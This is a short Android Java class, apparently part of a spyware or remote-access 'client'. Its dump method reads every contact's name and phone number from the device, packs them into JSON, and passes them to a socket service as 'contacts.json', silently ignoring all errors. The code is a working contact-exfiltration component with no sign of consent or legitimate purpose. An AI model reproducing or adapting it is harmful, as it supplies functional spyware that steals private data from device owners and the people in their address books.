package com.rainbow.client;

import android.content.Context;
import android.provider.ContactsContract;
import android.database.Cursor;
import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsHelper {
    public static void dump(Context ctx) {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("name", c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("number", c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    arr.put(o);
                }
                c.close();
            }
            SocketService2.sendFile("contacts.json", arr.toString().getBytes());
        } catch (Exception ignored) {}
    }
}